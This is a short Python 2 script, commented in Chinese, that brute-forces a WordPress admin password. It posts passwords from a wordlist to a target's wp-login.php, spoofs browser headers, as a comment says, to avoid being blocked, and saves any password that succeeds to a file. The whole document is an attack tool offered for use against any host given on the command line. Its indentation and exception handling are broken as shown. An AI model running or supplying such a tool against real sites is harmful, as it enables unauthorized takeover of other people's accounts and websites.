# coding=utf-8
# 破解wordpress 后台用户密码
import urllib, urllib2, time, re, cookielib,sys


class wordpress():
    def __init__(self, host, username):
		#初始化定义 header ，避免被服务器屏蔽
        self.username = username
        self.http="http://"+host
        self.url =  self.http + "/wp-login.php"
        self.redirect = self.http + "/wp-admin/"
        self.user_agent = 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)'
        self.referer=self.http+"/wp-login.php"
        self.cook="wordpress_test_cookie=WP+Cookie+check"
        self.host=host
        self.headers = {'User-Agent': self.user_agent,"Cookie":self.cook,"Referer":self.referer,"Host":self.host}
        self.cookie = cookielib.CookieJar()
        self.opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(self.cookie))


    def crash(self, filename):
        try:
            pwd = open(filename, 'r')
			#读取密码文件，密码文件中密码越多破解的概率越大
            while 1 :
                i=pwd.readline()
                if not i :
                    break

                data = urllib.urlencode(
                    {"log": self.username, "pwd": i.strip(), "testcookie": "1", "redirect_to": self.redirect})
                Req = urllib2.Request(url=self.url, data=data, headers=self.headers)
				#构造好数据包之后提交给wordpress网站后台
                Resp = urllib2.urlopen(Req)
                result = Resp.read()
                # print result
                login = re.search(r'login_error', result)
				#判断返回来的字符串，如果有login error说明失败了。
                if login:
                    pass
                else:
                    print "Crashed! password is %s %s" % (self.username,i.strip())
                    g=open("wordpress.txt",'w+')
                    g.write("Crashed! password is %s %s" % (self.username,i.strip()))
                    pwd.close()
                    g.close()
					#如果匹配到密码， 则这次任务完成，退出程序
                    exit()
                    break

            pwd.close()

			except Exception, e:
            print "error"
            print e
            print "Error in reading password"


if __name__ == "__main__":
    print "begin at " + time.ctime()
    host=sys.argv[1]
    #url = "http://"+host
	#给程序提供参数，为你要破解的网址
    user = sys.argv[2]
    dictfile=sys.argv[3]
	#提供你事先准备好的密码文件
    obj = wordpress(host, user)
    #obj.check(dictfile)
    obj.crash(dictfile)
    #obj.crash_v()
    print "end at " + time.ctime()

